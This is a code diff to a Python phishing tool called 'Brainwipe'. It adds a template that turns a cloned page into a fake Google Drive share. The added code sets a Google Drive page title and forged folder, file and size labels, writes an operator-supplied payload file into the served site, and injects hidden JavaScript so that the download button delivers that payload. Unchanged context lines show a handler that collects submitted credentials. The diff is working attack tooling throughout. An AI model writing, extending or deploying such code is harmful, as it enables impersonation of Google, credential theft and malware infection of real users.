@@ -79,7 +79,7 @@ class CredentialHandler(BaseHTTPRequestHandler):
         self.wfile.write(b"Credentials received. Redirecting...")
         self.wfile.write(f'<meta http-equiv="refresh" content="0;url={redirect_url}">'.encode())
 class Brainwipe:
-    def __init__(self, verbose=False, no_cleanup=False, template=None):
+    def __init__(self, verbose=False, no_cleanup=False, template=None, foldername=None, filename=None, payload=None, filesize=None, payload_name=None):
         self.target_url = None
         self.clone_dir = None
         self.verbose = verbose
@@ -91,6 +91,11 @@ class Brainwipe:
         self.redirect_url = None
         self.httpd = None
         self.template = template
+        self.foldername = foldername
+        self.filename = filename
+        self.payload = payload
+        self.filesize = filesize
+        self.payload_name = payload_name
         atexit.register(self.stop_and_cleanup)
         signal.signal(signal.SIGINT, self.signal_handler)
         signal.signal(signal.SIGTERM, self.signal_handler)
@@ -426,7 +431,7 @@ class Brainwipe:
                         pass
             except Exception as e:
                 print(f"[-] Cleanup failed: {e}")
-    def run(self, url=None, verbose=False, no_cleanup=False, email_code=False, phone_code=False, button_color="#007bff", redirect_url=None, template=None):
+    def run(self, url=None, verbose=False, no_cleanup=False, email_code=False, phone_code=False, button_color="#007bff", redirect_url=None, template=None, foldername=None, filename=None, payload=None, filesize=None, payload_name=None):
         self.verbose = verbose
         self.no_cleanup = no_cleanup
         self.email_code = email_code
@@ -434,6 +439,11 @@ class Brainwipe:
         self.button_color = button_color
         self.redirect_url = redirect_url
         self.template = template
+        self.foldername = foldername
+        self.filename = filename
+        self.payload = payload
+        self.filesize = filesize
+        self.payload_name = payload_name
         self.print_banner()
         self.check_dependencies()
         if self.template:
@@ -466,6 +476,82 @@ class Brainwipe:
             elif not found_main:
                 print("[-] No main HTML file found (index.html, login.html, mobile.html, index.php)")
                 return False
+            # Inject drive template arguments if template is drive
+            if self.template == "drive":
+                index_path = os.path.join(self.clone_dir, "index.html")
+                if os.path.exists(index_path):
+                    with open(index_path, "r", encoding="utf-8") as f:
+                        soup = BeautifulSoup(f, "html.parser")
+
+                    # Set <title> to 'DRIVENAME - Google Drive'
+                    drive_name = self.foldername or "Drive"
+                    title_text = f"{drive_name} - Google Drive"
+                    if soup.title:
+                        soup.title.string = title_text
+                    else:
+                        new_title = soup.new_tag("title")
+                        new_title.string = title_text
+                        if soup.head:
+                            soup.head.append(new_title)
+                        else:
+                            # If <head> doesn't exist, create it
+                            new_head = soup.new_tag("head")
+                            new_head.append(new_title)
+                            if soup.html:
+                                soup.html.insert(0, new_head)
+                            else:
+                                # As a fallback, insert at the top
+                                soup.insert(0, new_head)
+
+                    # Folder name
+                    folder_div = soup.find("div", class_="o-Yc-o-T")
+                    if folder_div and self.foldername:
+                        folder_div.string = self.foldername
+
+                    # File name
+                    file_div = soup.find("div", class_="KL4NAf")
+                    if file_div and self.filename:
+                        file_div.string = self.filename
+
+                    # File size
+                    size_span = soup.find("span", class_="jApF8d")
+                    if size_span and self.filesize:
+                        size_span.string = self.filesize
+
+                    # Download button
+                    download_div = soup.find("div", class_="akerZd")
+                    if download_div and self.payload:
+                        # Write payload to a file in the clone_dir
+                        payload_filename = self.payload_name or self.filename or "payload.bin"
+                        payload_path = os.path.join(self.clone_dir, payload_filename)
+                        # If payload is base64, decode; otherwise, write as text
+                        try:
+                            import base64
+                            # Try to decode as base64, fallback to text
+                            try:
+                                payload_bytes = base64.b64decode(self.payload)
+                            except Exception:
+                                payload_bytes = self.payload.encode("utf-8")
+                            with open(payload_path, "wb") as pf:
+                                pf.write(payload_bytes)
+                        except Exception as e:
+                            print(f"[-] Error writing payload: {e}")
+                        # Remove any existing <a> or onclick
+                        for a in download_div.find_all("a"):
+                            a.decompose()
+                        # Add a download link (hidden) and JS to trigger it
+                        soup.body.append(BeautifulSoup(f'''
+                            <a id="brainwipe-download-link" href="/{payload_filename}" download="{payload_filename}" style="display:none;"></a>
+                            <script>
+                            document.querySelector('.akerZd').onclick = function() {{
+                                var link = document.getElementById('brainwipe-download-link');
+                                link.click();
+                            }};
+                            </script>
+                        ''', "html.parser"))
+
+                    with open(index_path, "w", encoding="utf-8") as f:
+                        f.write(str(soup))
             # Optionally, modify the template (add fields/colors) if needed
             # For now, just serve as-is
             server_thread = Thread(target=self.start_server)
@@ -513,6 +599,12 @@ def main():
     parser.add_argument("--redirect-url", help="Custom redirect URL after form submission")
     parser.add_argument("--template", help="Name of the template to serve from the sites directory")
     parser.add_argument("--template-list", action="store_true", help="List all available templates and exit")
+    parser.add_argument("--foldername", help="Folder name for drive template")
+    parser.add_argument("--filename", help="File name for drive template")
+    parser.add_argument("--payload", help="Payload for drive template")
+    parser.add_argument("--filesize", help="File size for drive template")
+    parser.add_argument("--payload-file", help="Path to a file to use as the payload (will be base64-encoded automatically)")
+    parser.add_argument("--payload-name", help="Payload file name for drive template (overrides --filename for payload only)")
     args = parser.parse_args()
 
     if args.template_list:
@@ -530,7 +622,26 @@ def main():
                 print(f"  - {t}")
         sys.exit(0)
 
-    brainwipe = Brainwipe(template=args.template)
+    import base64
+    payload = args.payload
+    filename = args.filename
+    payload_name = args.payload_name
+    if args.payload_file:
+        with open(args.payload_file, "rb") as pf:
+            payload = base64.b64encode(pf.read()).decode("utf-8")
+        if not args.filename:
+            filename = os.path.basename(args.payload_file)
+        if not payload_name:
+            payload_name = os.path.basename(args.payload_file)
+
+    brainwipe = Brainwipe(
+        template=args.template,
+        foldername=args.foldername,
+        filename=filename,
+        payload=payload,
+        filesize=args.filesize,
+        payload_name=payload_name
+    )
     success = brainwipe.run(
         url=args.url,
         verbose=args.verbose,
@@ -539,7 +650,12 @@ def main():
         phone_code=args.phone_code,
         button_color=args.button_color,
         redirect_url=args.redirect_url,
-        template=args.template
+        template=args.template,
+        foldername=args.foldername,
+        filename=filename,
+        payload=payload,
+        filesize=args.filesize,
+        payload_name=payload_name
     )
     sys.exit(0 if success else 1)
 if __name__ == "__main__":
